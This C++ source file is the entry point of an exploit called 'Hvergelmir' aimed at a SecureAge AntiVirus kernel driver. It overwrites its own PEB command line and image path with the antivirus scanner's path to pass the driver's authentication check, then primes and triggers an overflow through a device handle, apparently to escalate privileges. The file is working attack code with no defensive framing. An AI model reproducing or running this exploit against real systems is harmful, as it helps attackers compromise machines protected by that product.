#include "Hvergelmir.h"
#include "general.h"

int main()
{
	HANDLE currentProc = GetCurrentProcess();
	PROCESS_BASIC_INFORMATION ProcessInformation;
	ULONG lenght = 0;
	HINSTANCE ntdll;
	MYPROC GetProcessInformation;

	// Path of the antivirus used to bypass the authentication check
	wchar_t commandline[] = L"C:\\Program Files\\SecureAge\\AntiVirus\\sascansvc.exe";
	ntdll = LoadLibrary(TEXT("Ntdll.dll"));
	GetProcessInformation = (MYPROC)GetProcAddress(ntdll, "NtQueryInformationProcess");

	// Get _PEB object
	(GetProcessInformation)(currentProc, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &lenght);

	// Spoof our process path to bypass the driver's authentication check
	ProcessInformation.PebBaseAddress->ProcessParameters->CommandLine.Buffer = commandline;
	ProcessInformation.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = commandline;



	DEBUG_PRINT(" [*] Starting Hvergelmir Exploit\n");

    Hvergelmir &h = Hvergelmir::getInstance();
	OverflowManager* overflowManager = new OverflowManager(GetDeviceHandle());

	// Bind OverflowManager member functions into std::function via lambdas
	h.SetOverflowFunctions(
		[overflowManager](UINT64 count) { overflowManager->PrimeOverflow(count); },
		[overflowManager](BYTE* buf, UINT64 size) { overflowManager->TriggerOverflow(buf, size); },
		[overflowManager]() { overflowManager->PassOverflow(); }
	);

	if (!h.VerifySystem()) {
		DEBUG_PRINT(" [!] System verification failed. Exiting.\n");
		return -1;
	}
	if (!h.Exploit()) {
		DEBUG_PRINT(" [!] Exploit failed. Exiting.\n");
		return -1;
	}

	 DEBUG_PRINT(" [*] Exploit completed successfully.\n");
	 return 0;
}